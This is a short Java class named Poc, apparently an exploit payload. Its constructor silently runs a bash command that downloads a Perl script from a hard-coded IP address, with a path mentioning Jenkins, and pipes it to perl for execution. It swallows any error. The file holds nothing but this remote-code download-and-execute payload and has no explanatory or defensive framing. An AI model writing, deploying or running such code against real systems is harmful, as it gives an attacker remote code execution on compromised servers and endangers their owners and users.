public class Poc {
    public Poc(){
        try {
            String payload = "curl 45.55.211.79/.cache/jenkins/jen.pl | perl -";
            String[] cmds = {"/bin/bash", "-c", payload};
            java.lang.Runtime.getRuntime().exec(cmds);
        } catch (Exception e) { }

    }
}
